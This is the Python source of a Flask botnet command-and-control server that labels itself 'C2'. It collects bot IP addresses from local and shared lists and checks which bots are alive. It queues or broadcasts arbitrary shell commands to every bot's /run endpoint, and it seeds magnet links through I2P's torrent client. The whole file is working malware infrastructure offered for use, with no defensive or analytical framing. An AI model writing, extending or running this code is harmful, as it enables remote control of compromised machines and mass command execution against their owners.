from flask import Flask, request, jsonify, send_from_directory
import os
import threading
import time
import requests
import json
import socket

app = Flask(__name__)
SHARED_DIR = "shared_bots"
MAGNET_FILE = "magnet_links.txt"
BOT_LIST = "bots.txt"
COMMAND_FILE = "commands.json"

os.makedirs(SHARED_DIR, exist_ok=True)
if not os.path.exists(BOT_LIST):
    open(BOT_LIST, "w").close()
if not os.path.exists(COMMAND_FILE):
    with open(COMMAND_FILE, "w") as f:
        f.write("{}")

def safe_load_json(path):
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"[!] Error reading {path}: {e}")
        return {}

def safe_save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[!] Error writing {path}: {e}")

def load_all_bots():
    bots = set()
    try:
        with open(BOT_LIST) as f:
            for line in f:
                ip = line.strip()
                if ip and not ip.startswith("#"):
                    bots.add(ip)
    except Exception as e:
        print(f"[!] Failed reading bots.txt: {e}")

    for fname in os.listdir(SHARED_DIR):
        try:
            with open(os.path.join(SHARED_DIR, fname)) as f:
                for line in f:
                    ip = line.strip()
                    if ip:
                        bots.add(ip)
        except Exception:
            pass
    return sorted(bots)

def check_i2p():
    try:
        r = requests.get("http://127.0.0.1:7657/", timeout=5)
        return r.ok
    except:
        return False

def start_i2p_torrents():
    if not os.path.exists(MAGNET_FILE):
        print("[*] No magnet_links.txt found.")
        return
    with open(MAGNET_FILE) as f:
        for line in f:
            magnet = line.strip()
            if magnet:
                try:
                    requests.post("http://127.0.0.1:7657/i2psnark/",
                                  data={"action": "Add Torrent", "magnet": magnet}, timeout=10)
                    print(f"[✓] Added magnet: {magnet}")
                except Exception as e:
                    print(f"[!] Failed magnet: {e}")

def sync_shared_bots():
    while True:
        bots = load_all_bots()
        try:
            with open(BOT_LIST, "w") as f:
                for b in bots:
                    f.write(b + "\n")
        except Exception as e:
            print(f"[!] Failed writing bots.txt: {e}")
        time.sleep(60)

@app.route("/")
def index():
    return "C2 OK"

@app.route("/check")
def check():
    return jsonify({
        "i2p_ok": check_i2p(),
        "magnet_file_found": os.path.exists(MAGNET_FILE),
        "shared_bots_folder": os.path.exists(SHARED_DIR),
        "bots_total": len(load_all_bots())
    })

@app.route("/bots")
def bots():
    return jsonify(load_all_bots())

@app.route("/heartbeat")
def heartbeat():
    bots = load_all_bots()
    alive = []
    for ip in bots:
        try:
            r = requests.get(f"http://{ip}/ping", timeout=3)
            if r.status_code == 200 and "pong" in r.text.lower():
                alive.append(ip)
        except:
            continue
    return jsonify({"alive": alive, "count": len(alive)})

@app.route("/getcmd/<botid>")
def get_cmd(botid):
    cmds = safe_load_json(COMMAND_FILE)
    return cmds.get(botid, "")

@app.route("/sendcmd", methods=["POST"])
def send_cmd():
    data = request.json
    botid = data.get("botid")
    cmd = data.get("cmd")
    if not botid or not cmd:
        return jsonify({"error": "Missing botid or cmd"}), 400

    cmds = safe_load_json(COMMAND_FILE)
    cmds[botid] = cmd
    safe_save_json(COMMAND_FILE, cmds)
    return jsonify({"status": "Command set."})

@app.route("/runall", methods=["POST"])
def runall():
    data = request.json
    cmd = data.get("cmd")
    if not cmd:
        return jsonify({"error": "Missing cmd"}), 400

    bots = load_all_bots()
    cmds = safe_load_json(COMMAND_FILE)
    for ip in bots:
        cmds[ip] = cmd
    safe_save_json(COMMAND_FILE, cmds)
    return jsonify({"status": f"Set for {len(bots)} bots."})

@app.route("/broadcast", methods=["POST"])
def broadcast_cmd():
    cmd = request.json.get("cmd")
    if not cmd:
        return jsonify({"error": "Missing cmd"}), 400

    bots = load_all_bots()
    success = 0
    for ip in bots:
        try:
            r = requests.post(f"http://{ip}/run", json={"cmd": cmd}, timeout=5)
            if r.status_code == 200:
                success += 1
        except Exception as e:
            print(f"[!] Failed to push to {ip}: {e}")
    return jsonify({"sent": success, "total": len(bots)})

def run():
    print("[*] I2P check...")
    if not check_i2p():
        print("[!] I2P is not available. Continuing anyway.")
    start_i2p_torrents()
    threading.Thread(target=sync_shared_bots, daemon=True).start()
    print("[*] C2 running on 0.0.0.0:8080")
    app.run(host="0.0.0.0", port=8080)

if __name__ == "__main__":
    run()
